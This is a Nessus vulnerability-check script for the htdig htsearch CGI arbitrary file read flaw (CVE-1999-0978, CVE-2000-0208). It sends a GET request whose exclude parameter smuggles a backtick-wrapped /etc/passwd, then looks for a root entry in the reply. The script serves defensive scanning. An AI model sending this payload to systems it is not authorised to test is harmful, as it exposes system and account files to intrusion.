#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10105);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-1999-0978", "CVE-2000-0208");
 script_bugtraq_id(867, 1026);
 script_xref(name:"OSVDB", value:"89");
 script_xref(name:"OSVDB", value:"1160");

 script_name(english:"ht://Dig < 3.1.5 htsearch CGI Multiple Vulnerabilities");
 script_summary(english:"Checks if htdig is vulnerable");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a web search engine that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'htsearch' CGI, which is part of the htdig package, allows anyone
to read arbitrary files on the target host." );
 script_set_attribute(attribute:"see_also", value:"http://www.debian.org/security/2000/20000227" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to htdigg 3.1.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 res = http_send_recv3(
   method:"GET", 
   item:string(dir, "/htsearch?exclude=%60/etc/passwd%60"), 
   port:port
 );
 if (isnull(res)) exit(1, "Server did not respond to GET request");
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2])){
   security_warning(port);
   exit(0);
 }
}


